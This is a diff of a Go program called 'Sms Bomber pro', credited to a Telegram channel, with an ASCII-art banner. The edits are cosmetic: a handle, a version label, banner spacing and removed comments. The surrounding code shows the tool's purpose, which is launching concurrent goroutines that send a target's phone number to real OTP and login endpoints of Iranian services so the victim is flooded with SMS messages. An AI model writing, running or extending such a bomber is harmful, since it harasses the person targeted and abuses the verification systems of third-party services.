@@ -12,10 +12,10 @@ import (
 )
 
 /*
-Channel telegram : @unknown000_cipher
+Channel telegram : @unknown000cipher
 ===============================================
 
-Sms Bomber pro v1
+Sms Bomber pro 
 */
 func clearScreen() {
 	cmd := exec.Command("clear")
@@ -69,12 +69,12 @@ func main() {
             #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#              
             -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:              
              *@@%#            -@@@@@@.             #@@@+               
-             .%@@# @unknown000 @@@@@@    _cipher   #@@#                
+             .%@@# @unknown000 @@@@@@     cipher   #@@#                
               :@@*           =%@@@@@@%-            *@@:                
               #@@%         .*@@@@#%@@@%+.          %@@+                
               %@@@+      -#@@@@@* :%@@@@@*-      *@@@*                
               *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=                
-               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*                 
+               #@@@@@@@@@@@@@@*  Go  #@@@@@@@@@@@@@@*                 
                 =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                  
                   .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                    
                       #@@@@@@@@@@@@@@@@@@@@@@+                        
@@ -155,8 +155,7 @@ func main() {
 		go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)
-		// go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0", map[string]interface{}{
-		// 	"":phone}, ch)
+		
 		go sms("https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{
 			"phone": phone,
 		}, ch)
@@ -718,6 +717,4 @@ func main() {
 	}
 }
 
-/*
-End !
-*/
+
